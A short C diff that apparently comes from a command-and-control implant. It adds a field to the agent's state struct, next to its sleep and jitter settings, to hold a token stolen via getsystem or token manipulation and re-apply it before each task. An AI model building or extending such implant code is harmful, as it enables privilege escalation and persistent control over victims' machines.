@@ -227,6 +227,7 @@ typedef struct {
     int sleep_ms;
     int jitter_pct;
     BOOL running;
+    HANDLE impersonation_token;  /* Stolen token from getsystem/tokenmanip — re-applied before each task */
 } AgentState;
 
 /* ─── Buffer helpers ─── */
